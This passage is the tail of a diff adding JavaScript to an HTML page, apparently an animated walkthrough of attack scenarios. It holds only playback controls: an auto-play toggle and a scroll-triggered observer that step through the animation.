+  st.step=0; renderStep(atk, 0, false);
+}
+function toggleAuto(atk){
+  const st = state[atk];
+  const btn = document.getElementById(atk+'-auto');
+  if(st.autoTimer){
+    clearInterval(st.autoTimer); st.autoTimer=null;
+    btn.textContent='⏵ Auto'; btn.classList.remove('active');
+  } else {
+    btn.textContent='⏸ Pause'; btn.classList.add('active');
+    const len = ATTACKS[atk].steps.length;
+    st.autoTimer = setInterval(()=>{
+      if(st.step < len-1){ st.step++; renderStep(atk, st.step, true); }
+      else { clearInterval(st.autoTimer); st.autoTimer=null; btn.textContent='⏵ Auto'; btn.classList.remove('active'); }
+    }, 2500);
+  }
+}
+// Scroll auto-start
+const obs = new IntersectionObserver(entries=>{
+  entries.forEach(e=>{
+    if(e.isIntersecting){
+      const atk = e.target.getAttribute('data-attack');
+      if(atk && state[atk].step===0 && !state[atk].autoTimer){
+        setTimeout(()=>toggleAuto(atk), 600);
+      }
+      obs.unobserve(e.target);
+    }
+  });
+},{threshold:0.4});
+document.querySelectorAll('.attack-section').forEach(s=>obs.observe(s));
+</script>
+</body>
+</html>
